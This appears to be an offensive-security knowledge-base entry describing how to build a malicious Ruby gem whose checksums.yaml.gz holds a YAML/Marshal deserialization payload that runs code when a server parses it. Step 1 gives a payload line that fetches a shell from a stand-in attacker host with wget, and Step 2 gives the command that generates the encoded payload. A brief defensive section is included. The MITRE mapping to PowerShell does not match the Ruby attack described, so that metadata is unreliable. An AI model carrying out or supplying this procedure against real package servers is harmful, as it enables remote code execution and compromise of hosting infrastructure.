---
tags:
  - rce
  - payload
  - deserialization
  - ruby
type: procedure
tools:
  - '[[tools/ruby]]'
  - '[[tools/generate.rb-script]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/ruby-generate-payload]]'
platforms:
  - Linux
techniques:
  - '[[PowerShell]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: af97d4f9-3086-483a-ac60-cdf369c33ec5
created_at: '2025-12-14T17:23:53.960Z'
updated_at: '2025-12-14T17:23:53.960Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[PowerShell]]'
---
# Craft-Malicious-Gem-with-Deserialization-Payload

## Summary

This procedure crafts a proof-of-concept malicious Ruby gem by embedding a deserialization payload in the checksums.yaml.gz file, leveraging known Marshal exploitation techniques to execute arbitrary Ruby code upon server parsing.

## Description

The attacker adapts a Ruby script from a Rails RCE exploit to generate a base64-encoded payload from Ruby code (e.g., system calls like wget). This payload is inserted into the checksums.yaml.gz of a gem package (poc.gem), exploiting the unsafe YAML.load in Gem::Package#read_checksums. When uploaded, the server deserializes the YAML, instantiates gadgets, and triggers Marshal.load for code execution. Requires Ruby environment and knowledge of deserialization chains.

## Requirements

1. Ruby interpreter installed
2. generate.rb script (adapted from https://github.com/charliesome/charlie.bz/blob/master/posts/rails-3.2.10-remote-code-execution.md)
3. payload.rb file with target code (e.g., wget to attacker server)

## Defense

Defensive measures and detection strategies:

- Validate and scan gem contents for malicious payloads before parsing
- Restrict YAML parsing to safe modes with object deserialization disabled
- Use integrity checks on checksum files to prevent tampering

## Objectives

1. Generate a valid deserialization gadget chain
2. Embed payload in gem structure without breaking format
3. Ensure execution of arbitrary code like network exfiltration

## Instructions

### Step 1: Prepare Payload Code

**Context**: Define the Ruby code to execute upon deserialization.

Create payload.rb:

```ruby
system('wget http://attacker.com/shell')
```

> This will be encoded into the Marshal payload.

### Step 2: Generate Encoded Payload

**Context**: Use the script to create base64 Marshal data from the payload.

Execute [[commands/ruby-generate-payload]]:

```bash
ruby generate.rb payload.rb
```

> Outputs base64 string for insertion into checksums.yaml.

### Step 3: Assemble Malicious Gem

**Context**: Insert the payload into checksums.yaml.gz and package as .gem.

Manually edit or script the gem creation to include the tampered checksums file.

> Result: poc.gem ready for upload.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[PowerShell]]

### Sub-Techniques


## Commands Used

- [[commands/ruby-generate-payload]]

## Tools Used

- [[tools/ruby]]
- [[tools/generate.rb-script]]

## Tags

- rce
- payload
